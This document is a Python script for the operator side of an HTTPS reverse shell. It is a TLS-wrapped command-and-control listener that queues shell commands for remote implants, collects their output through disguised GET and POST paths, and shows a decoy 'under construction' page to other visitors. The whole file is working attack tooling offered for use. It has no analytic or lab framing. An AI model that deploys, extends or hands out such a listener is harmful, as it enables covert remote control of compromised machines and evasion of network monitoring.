#!/usr/bin/env python3
# Start this locally to receive the reverse shell
# Preferably on port 443, i.e. use sudo/root
# U+0A75
import argparse
import socket
import ssl
from queue import Queue, Empty
import threading
import json
import sys

# handle command line arguments
argument_parser = argparse.ArgumentParser(description='HTTPS Reverse Shell Listener')
argument_parser.add_argument("-p", "--port", help='Listening port', default=8443, type=int, required=False)
argument_parser.add_argument("-k", "--key", help='RSA Private Key location', default="server.key", type=str, required=False)
argument_parser.add_argument("-c", "--cert", help='Certificate location', default="server.crt", type=str, required=False)
args = vars(argument_parser.parse_args())

HOST = "0.0.0.0"
PORT = args['port'] # 443
CERT = args['cert'] # "server.crt"
KEY = args['key'] # "server.key"

# The HTTP headers our client will actually use
# Yes, this is hacky
heartbeat_get = b"GET /YXNmYXNkZnNk" # used by the client to ask for commands / check for server heartbeat
response_post = b"POST /dmJ2YnZiZGZh" # used by the client to return command std:out and std:err

# Queues for thread interaction
command_queue = Queue() # command queue
output_queue = Queue() # output queue
interrupted = False
active_clients = set()

# dequeue element
# Returns element or <None>, if there is no element (no blocking)
# If you supply a timeout then it will wait for an element until the time runs out (block till timeout) and then return <None>
def deq(qu, timeout=None):
    try:
        if(timeout): # seconds
            return qu.get(True, timeout)
        return qu.get(False)
    except Empty:
        return None

# expects all input to be utf-8 strings
def build_response(headers, payload):
    res = "HTTP/1.1 200 OK\r\n"

    if len(payload):
        headers["Content-Length"] = len(payload)        
    
    for key in headers:
        res += str(key) + ": " + str(headers[key]) + "\r\n"
    
    res += "\r\n"
    res += payload
    return res.encode("utf-8")


# Interact with client
def handle_client(conn, source):
    received = conn.recv()

    # Client asks for commands
    if received.startswith(heartbeat_get):
        """
        # ToDo: build proper session management and separate clients
        if source[0] not in active_clients:
            active_clients.add(source[0])
            output_queue.put(json.dumps({ "output": "[!] New client connected:" + source[0]}))
        """

        command = deq(command_queue) # get command from queue or <None>

        headers = {
            "Content-Type": "application/json",
            "Connection": "Closed"
        }

        # Pack as json. <None> gets turned into <null> automatically
        payload = { "com" : command } 
        body = json.dumps(payload)

        conn.write(build_response(headers, body))
        conn.close()
        return

    # Client returns command response
    if received.startswith(response_post):
        head_body = received.split(b"\r\n\r\n", 1)
        if len(head_body) > 1:
            body = head_body[1]
            output_queue.put(body) # hand over command output to I/O loop

        # respond whatever
        headers = {
            "Content-Type": "text/plain; charset=utf-8",
            "Connection": "Closed"
        }
        payload = "Sasquatch"

        conn.write(build_response(headers, payload))
        conn.close()
        return

    # fob off unwanted guests
    conn.write(build_response({"Content-Type": "text/plain; charset=utf-8", "Connection": "Closed"}, "This page is under construction."))
    conn.close()

# Create SSL/TLS context which we use to wrap all incoming connections
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile=CERT, keyfile=KEY)
context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Force TLS 1.2 or newer
context.set_ciphers('EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH')

# Create general purpose socket for accepting incomming connections
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((HOST, PORT))
sock.listen(5)
print("[*] Listening on port {}...".format(PORT))

# Listening Loop
def listening_loop():
    while not interrupted:
        conn = None
        incoming_socket, incoming_addr = sock.accept()

        try:
            conn = context.wrap_socket(incoming_socket, server_side=True)
            handle_client(conn, incoming_addr)
    
        except ssl.SSLError as e:
            print(e)

        finally:
            if conn:
                conn.close()

# Start network loop as daemon thread
server_thread = threading.Thread(target=listening_loop)
server_thread.setDaemon(True)
server_thread.start()

# Decide what and how to display command response/error
def display_response(response):
    res_json = json.loads(response)
    print(res_json.get("output"))

    if(res_json.get("error")):
        print("Error:", res_json.get("error"))

# I/O Loop
response_timeout = 10
try: 
    while not interrupted:
        user_input = input("> ")

        # Print any possible leftovers
        # ToDo: think of a better way to do this
        while not output_queue.empty():
            print("[*] Old messages:")
            display_response(deq(output_queue))

        # skip empty commands (pressing enter)
        if not user_input:
            continue

        # Hand over command to the network loop
        command_queue.put(user_input)

        # wait a bit for a resonse
        response = deq(output_queue, response_timeout)
        if response:
            display_response(response)
        else:
            print("[!] Response took too long...")

except KeyboardInterrupt:
    print("\r\nShutting down...")
    interrupted = True
    sys.exit()